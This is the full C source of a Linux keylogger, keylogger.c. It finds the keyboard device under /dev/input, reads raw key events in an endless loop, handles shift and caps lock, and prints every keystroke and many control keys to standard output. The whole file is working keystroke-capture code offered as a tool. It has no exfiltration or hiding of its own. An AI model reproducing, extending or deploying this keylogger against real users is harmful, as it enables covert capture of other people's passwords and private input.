/**
 * @file   keylogger.c
 * @author Adam Risi <ajrisi@gmail.com>
 * @date   Thu Sep 17 23:42:54 2009
 * 
 * @brief  A keylogger written in C, uses the /dev/input/device method
 * 
 * 
 */

#include <stdio.h>
#include <string.h>
#include <getopt.h>
#include <fcntl.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <dirent.h>

#define VERSION "1.0.2"

char translate[]      = "  1234567890-=\b\tqwertyuiop[]\n asdfghjkl;'   zxcvbnm,./ *                                                                       ";
char translateshift[] = "  !@#$%^&*()_+\b\tQWERTYUIOP{}\n ASDFGHJKL:'   ZXCVBNM<>? *                                                                       ";


#define PATH "/dev/input/"

#define PROBE_FAILED -1
#define PROBE_MATCH 1 

#define SHIFT_L 42
#define SHIFT_R 54

#define PRINT_SHIFT 0 

#define LONG_BITS (sizeof(long) * 8)
#define NBITS(x) (((x) + LONG_BITS - 1) / LONG_BITS)
#define TestBit(bit, array) (array[(bit) / LONG_BITS]) & (1 << ((bit) % LONG_BITS))
#define V if(verbose_mode)
#define SC if(show_control)
#define SS if(show_selective_control || show_control)

static int verbose_mode   = 0;
static int show_control   = 0;
static int show_selective_control = 1;

void usage()
{
  fprintf(stderr, "usage: keylogger [keyboard_device]\n");
}


int test_device (char *buf)
{
  int fd;
  int results;
  char rep[2];

  if ((fd = open (buf, O_RDONLY | O_NONBLOCK)) >= 0) {

    /* a clever little hack, this looks for device that has the repeat option set - 
       this is normally just the keyboard */
    if(ioctl(fd, EVIOCGREP, rep)) {
      results = PROBE_FAILED;
    } else {
      /* this is probably the keyboard */
      results = PROBE_MATCH;
    }
    
    close(fd);

  } else {
    results = PROBE_FAILED;
  }
  return results;
}

int read_capslock(int kb, int *cl) {
  int yalv;
  unsigned char led_b=0;
  int ret = 0;

  *cl = 0;

  ioctl(kb, EVIOCGLED(sizeof(led_b)), &led_b);
  for (yalv = 0; yalv < LED_MAX; yalv++) {
    if (TestBit(yalv, (&led_b))) {
      if(yalv == LED_CAPSL) {
	*cl = 1;
	ret = 1;
      }
    }
  }

  /* return success (1) or failure (-1) or undeterminable (0) */
  return ret;
}


/*
 * Check each device in /dev/input and determine if
 * it is a keyboard device
 */
char * scan_for_devices (char *path)
{

  DIR *event_devices = opendir (PATH);
  struct dirent *dir = NULL;
  int found = PROBE_FAILED;
  
  if (event_devices == NULL) {
    V{
      printf ("Cannot open the event interface directory (%s)\n", PATH);
      perror("opendir()");
    }
    exit(1);
  }
  
  while ((dir = readdir (event_devices)) != NULL && (found != PROBE_MATCH)) {
    if ((strncmp (dir->d_name, ".", 1)) != 0) {
      snprintf (path, 1024, "%s%s", PATH, dir->d_name);
      found = test_device (path);
    }
  }

  closedir(event_devices);

  if (found == PROBE_MATCH) {
    return path;
  } else {
    return NULL;
  }
} 


int main(int argc, char **argv) 
{
  int kb;
  char *dev_path;
  char *auto_dev_path;
  struct input_event ev[64];
  int yalv;
  size_t rb = 0;
  int shift = 0;
  int caps = 0;
  int option_index;

  while(1) {
    option_index = 0;

    static struct option long_options[] = {
      { "version", no_argument, 0, 0},
      { "show-control", no_argument, 0, 0},
      { "show-selective-control", no_argument, 0, 0},
      {0, 0, 0, 0}
    };
    
    enum {
      VERSION_OPT,
      SHOW_CONTROL_MODE_OPT,
      SHOW_SELECTIVE_CONTROL_MODE_OPT
    }

    o = getopt_long(argc, argv, "qv", long_options, &option_index);
    if(o == -1) {
      break;
    }
    
    switch(o) {
    case 'v':
      verbose_mode = 1;
      break;
    case 0:
      if(option_index == SHOW_SELECTIVE_CONTROL_MODE_OPT) {
	show_selective_control = 1;
	show_control = 0;
      } else if(option_index == SHOW_CONTROL_MODE_OPT) {
	show_control = 1;
	show_selective_control = 0;
      } else if(option_index == VERSION_OPT) {
	printf("keylogger version: " VERSION "\n");
	exit(0);
      } else {
	usage();
	exit(1);
      }
      break;
    default:
      /* strange get-opt error, just send the usage message and exit */
      usage();
      exit(1);
    }
  }

  if(show_selective_control) {
    V{
      fprintf(stderr, "Showing selective control key presses only\n");
    }
  }

  if(show_control) {
    V{
      fprintf(stderr, "Showing all control key presses\n");
    }
  }

  auto_dev_path = malloc(1024);
  if(auto_dev_path == NULL) {
    V{
      fprintf(stderr, "Could not alloc. for auto dev path\n");
      exit(1);
    }
  }
  memset(auto_dev_path, 0, 1024);

  /* we assume that the last argument, if it is still available, is the device
     that we want to attach to */  
  if (optind < argc) {
    dev_path = argv[argc-1];
  } else {
    /* no extra parameters,  assume they want to autodetect the keyboard */
    if(scan_for_devices(auto_dev_path) != NULL) {
      dev_path = auto_dev_path;
    } else {
      V{
	fprintf(stderr, "Could not determine that keyboard device path automatically");
      }
      exit(1);
    }
  }

  /* Open the device, and verify it opened properly */
  kb = open(dev_path, O_RDONLY);
  if(kb < 0) {
    V{
      fprintf(stderr, "Could not open keyboard device: %s\n", dev_path);
    }
    exit(1);
  } else {
    V{
      printf("Opened keyboard device: %s\n", dev_path);
    }
  }

  /* get the current state of capslock */
  if(read_capslock(kb, &caps) < 0) {
    V{
      fprintf(stderr, "Error reading caps lock state\n");
    }
    exit(1);
  }
  
  while(1) {
    rb=read(kb,ev,sizeof(struct input_event));
    
    if (rb < (int) sizeof(struct input_event)) {
      V{
	perror("evtest: short read");
      }
      exit (1);
    }
    
    for (yalv = 0; yalv < (int) (rb / sizeof(struct input_event)); yalv++) {
      if(EV_LED == ev[yalv].type) {
	if(ev[yalv].code == 1) {
	  /* the caps lock led changed states, I am going to interpret
	     this as a change in caps lock */
	  caps = ev[yalv].value;
	}
      } else if (EV_KEY == ev[yalv].type) {
	int c = ev[yalv].code;
    	/* a key-release, only matters if we are letting off shift */
	if(ev[yalv].value == 0) {

	  switch (c) {
	  case 1:  SC{printf("<esc-up>");}                break;
	  case 14: SC{printf("<backspace-up>");}          break;
	  case 15: SC{printf("<tab-up>");}                break;
	  case 42: SS{printf("<shift-l-up>");} shift=0;   break;
	  case 54: SS{printf("<shift-l-up>");} shift=0;   break;
	  case 29: SS{printf("<ctrl-up>");}               break;
	  case 56: SS{printf("<alt-up>");}                break;
	  case 58: SC{printf("<caps-lock-up>");}          break;
	  case 82: SC{printf("<ins-up>");}                break;
	  case 83: SS{printf("<del-up>");}                break;
	  }
	  
	} else {
	  switch (c) {
	  case 1:  SC{printf("<esc>");}                  break;
	  case 14: SS{printf("<backspace>");}            break;
	  case 15: SS{printf("<tab>");}                  break;
	  case 28: printf("\n");                         break;
	  case 42: SS{printf("<shift-l>");} shift=1;     break;
	  case 54: SS{printf("<shift-l>");} shift=1;     break;
	  case 29: SC{printf("<ctrl>");}                 break;
	  case 56: SC{printf("<alt>");}                  break;
	  case 82: SC{printf("<ins>");}                  break;
	  case 83: SC{printf("<del>");}                  break;
	  case 71: SS{printf("<home>");}                 break;
	  case 79: SS{printf("<end>");}                  break;
	  case 73: SC{printf("<pgup>");}                 break;
	  case 81: SC{printf("<pgdn>");}                 break;
	  case 72: SS{printf("<up>");}                   break;
	  case 80: SS{printf("<down>");}                 break;
	  case 75: SS{printf("<left>");}                 break;
	  case 77: SS{printf("<right>");}                break;
	  case 59: SC{printf("<f1>");}                   break;
	  case 60: SC{printf("<f2>");}                   break;
	  case 61: SC{printf("<f3>");}                   break;
	  case 62: SC{printf("<f4>");}                   break;
	  case 63: SC{printf("<f5>");}                   break;
	  case 64: SC{printf("<f6>");}                   break;
	  case 65: SC{printf("<f7>");}                   break;
	  case 66: SC{printf("<f8>");}                   break;
	  case 67: SC{printf("<f9>");}                   break;
	  case 68: SC{printf("<f10>");}                  break;
	  case 87: SC{printf("<f11>");}                  break;
	  case 88: SC{printf("<f12>");}                  break;
	  case 58: SC{printf("<caps-lock>");} caps ^= 1; break;
	    
	  default: {
	    /* for all characters where we might want to change their case based on shift */
	    printf("%c", (shift || (caps && ((translate[c] >= 97) && (translate[c] <= 122)))) ? translateshift[c] : translate[c] );
	  }
	    
	  } /* switch the character */
	} /* the else, is a down or repeat */
	fflush(0);
      } /* is a key press event */
    } /* for each read key */
  } /* forever loop */
  
  close(kb);
  return 0;
}
  
